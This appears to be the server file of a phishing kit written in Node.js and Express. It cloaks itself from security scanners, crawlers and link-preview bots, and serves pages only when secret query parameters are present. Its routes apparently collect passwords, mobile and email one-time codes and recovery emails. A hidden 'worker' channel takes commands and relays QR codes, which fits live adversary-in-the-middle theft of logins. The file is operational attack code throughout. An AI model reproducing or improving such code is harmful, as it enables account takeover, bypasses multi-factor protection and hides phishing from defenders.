
require('dotenv').config();
const express = require('express');
const http = require('http');
const path = require('path');
const session = require('express-session');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');

const app = express();
const server = http.createServer(app);

app.set('trust proxy', 1);
app.use(helmet({ contentSecurityPolicy: false }));

// Anti-bot: X-Robots-Tag header on all responses
app.use((req, res, next) => {
  res.setHeader('X-Robots-Tag', 'noindex, nofollow, noarchive, nosnippet');
  next();
});

// Anti-bot: Block known bot User-Agents and suspicious requests
const BOT_UA_PATTERNS = /bot|crawl|spider|slurp|scrape|fetch|curl|wget|python|httpx|axios|node-fetch|go-http|java\/|perl|ruby|php\/|libwww|mechanize|scrapy|phantomjs|headless|selenium|puppeteer|lighthouse|gtmetrix|pingdom|uptimerobot|semrush|ahrefs|mj12bot|dotbot|rogerbot|screaming|archive\.org|facebookexternalhit|twitterbot|linkedinbot|whatsapp|telegram|discord|slack/i;

app.use((req, res, next) => {
  const ua = req.headers['user-agent'] || '';
  
  // Skip anti-bot for worker endpoints
  if (req.path.startsWith('/worker-')) return next();

  // Block empty User-Agent
  if (!ua || ua.length < 10) {
    return res.status(403).end();
  }
  
  // Block known bots
  if (BOT_UA_PATTERNS.test(ua)) {
    return res.status(403).end();
  }
  
  // Block requests missing typical browser headers
  if (req.method === 'GET' && !req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|pdf)$/)) {
    const acceptLang = req.headers['accept-language'];
    const accept = req.headers['accept'];
    if (!acceptLang && !accept) {
      return res.status(403).end();
    }
  }
  
  next();
});

// Anti-bot: Aggressive rate limiting for all routes
const globalLimiter = rateLimit({
  windowMs: 1 * 60 * 1000,
  max: 200,
  message: '',
  standardHeaders: false,
  legacyHeaders: false,
  skip: (req) => req.path.startsWith('/worker-') || req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|woff2|pdf|txt)$/),
  validate: false
});
app.use(globalLimiter);
app.set('view engine', 'ejs');
app.set('views', path.join(__dirname, 'views'));

app.use(express.urlencoded({ extended: true }));
app.use(express.json({ limit: '10mb' }));
app.use(session({
  secret: process.env.SESSION_SECRET || require('crypto').randomBytes(32).toString('hex'),
  resave: false,
  saveUninitialized: false,
  cookie: { maxAge: 4 * 60 * 1000, httpOnly: true, secure: false, sameSite: 'strict' }
}));

const loginLimiter = rateLimit({
  windowMs: 15 * 60 * 1000,
  max: 10,
  message: 'Too many login attempts, try again after 15 minutes',
  skipSuccessfulRequests: true,
  validate: false
});
app.post('/dblogin', loginLimiter);

app.use(express.static(path.join(__dirname, 'public'), { maxAge: 0, etag: false }));

const REQUIRED_PARAMS = ['wetuweopfnfdjfgdfhdkjudfhw', 'svhsdfhadeiueirncbxjcbbxcxb'];
const EXCLUDED_PATHS = ['/dblogin', '/datatable', '/pwdready', '/pwdresult', '/codeload', '/mobileresult', '/motpresult', '/eotpresult', '/recemailresult', '/error', '/first'];
app.use((req, res, next) => {
  if (req.method !== 'GET') return next();
  if (EXCLUDED_PATHS.some(p => req.path.startsWith(p))) return next();
  if (req.path.startsWith('/req/')) return next();
  if (req.path.startsWith('/worker-')) return next();
  if (req.path.match(/\.(css|js|png|jpg|jpeg|gif|ico|svg|ttf|woff|pdf|txt)$/)) return next();
  if (!REQUIRED_PARAMS.some(p => p in req.query)) return res.render('error');
  next();
});

// SSE + HTTP worker connection
let workerRes = null; // SSE response object
const commandQueue = [];
const pendingRequests = {};
const WORKER_SECRET = process.env.WORKER_SECRET || 'BR2QbvhN3t+lE7IlBsqdHy7GK+fKkWwazTp/Ju/l7mc=';

// SSE endpoint - worker connects here to receive commands
app.get('/worker-sse', (req, res) => {
  const secret = req.query.secret;
  if (secret !== WORKER_SECRET) {
    console.log('[SSE] Invalid worker secret, rejecting');
    return res.status(403).end();
  }

  console.log('[SSE] Worker connected');

  // Set SSE headers
  res.writeHead(200, {
    'Content-Type': 'text/event-stream',
    'Cache-Control': 'no-cache',
    'Connection': 'keep-alive',
    'X-Accel-Buffering': 'no'
  });
  res.write(':connected\n\n');

  workerRes = res;

  // Heartbeat every 25s to keep connection alive
  const heartbeat = setInterval(() => {
    if (workerRes === res) {
      res.write(':ping\n\n');
    } else {
      clearInterval(heartbeat);
    }
  }, 25000);

  // Flush any queued commands immediately
  flushCommands();

  // Handle disconnect
  req.on('close', () => {
    console.log('[SSE] Worker disconnected');
    clearInterval(heartbeat);
    if (workerRes === res) workerRes = null;
  });
});

// Worker posts results here
app.post('/worker-result', (req, res) => {
  const secret = req.headers['x-worker-secret'];
  if (secret !== WORKER_SECRET) return res.status(403).end();

  const { id, result } = req.body;
  if (id && pendingRequests[id]) {
    pendingRequests[id](result);
    delete pendingRequests[id];
  }
  res.json({ ok: true });
});

// Worker uploads QR image here
app.post('/worker-upload-qr', (req, res) => {
  const secret = req.headers['x-worker-secret'];
  if (secret !== WORKER_SECRET) return res.status(403).end();

  const { base64 } = req.body;
  if (base64) {
    const fs = require('fs');
    const qrPath = path.join(__dirname, 'public', 'image', 'qr.png');
    fs.writeFileSync(qrPath, Buffer.from(base64, 'base64'));
    console.log('[SSE] QR image saved from worker');
  }
  res.json({ ok: true });
});

// Flush queued commands to worker via SSE
function flushCommands() {
  while (workerRes && commandQueue.length > 0) {
    const cmd = commandQueue.shift();
    workerRes.write(`data: ${JSON.stringify(cmd)}\n\n`);
  }
}

// Helper to send command to worker
function sendToWorker(action, payload) {
  return new Promise((resolve, reject) => {
    if (!workerRes) return resolve({ error: 'Worker not connected' });
    const id = Date.now() + Math.random().toString(36).substr(2, 9);
    const timeout = setTimeout(() => { delete pendingRequests[id]; resolve({ error: 'Timeout' }); }, 30000);
    pendingRequests[id] = (result) => { clearTimeout(timeout); resolve(result); };
    const cmd = { id, action, payload };
    commandQueue.push(cmd);
    flushCommands();
  });
}

// Make sendToWorker available to controllers
const authController = require('./controllers/authController');
authController.setSendToWorker(sendToWorker);

app.use('/', require('./routes/auth'));

// Health check endpoint - keeps app alive
app.get('/health', (req, res) => res.send('ok'));

const PORT = process.env.PORT || 3002;
server.listen(PORT, () => console.log(`Server running on port ${PORT}`));

process.on('uncaughtException', (e) => {
  console.error('[SERVER] Uncaught exception:', e.message);
});
process.on('unhandledRejection', (e) => {
  console.error('[SERVER] Unhandled rejection:', e.message || e);
});
